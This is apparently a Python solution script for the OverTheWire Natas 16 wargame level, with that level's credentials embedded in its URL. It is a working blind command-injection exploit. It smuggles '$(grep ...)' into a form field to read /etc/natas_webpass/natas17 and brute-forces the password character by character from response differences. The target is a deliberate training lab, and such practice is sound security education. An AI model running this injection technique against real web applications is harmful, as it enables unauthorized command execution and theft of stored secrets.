# Brute forces Natas 16 challenge to retrieve key

import requests, tqdm, string

url = 'http://natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh@natas16.natas.labs.overthewire.org/index.php'

password = ""
last_password_length = -1
while (last_password_length != len(password)):
    last_password_length = len(password)
    for current_guess in tqdm.tqdm((string.ascii_letters + string.digits)):
        myobj = {'needle': 'spooky$(grep ^' + password + current_guess + ' /etc/natas_webpass/natas17)'}
        x = requests.post(url, data = myobj)
        if "spooky" not in x.text:
            print(f"Password Char({len(password)}) is {current_guess}.")
            password += current_guess
            break
print(f"Password is: {password}")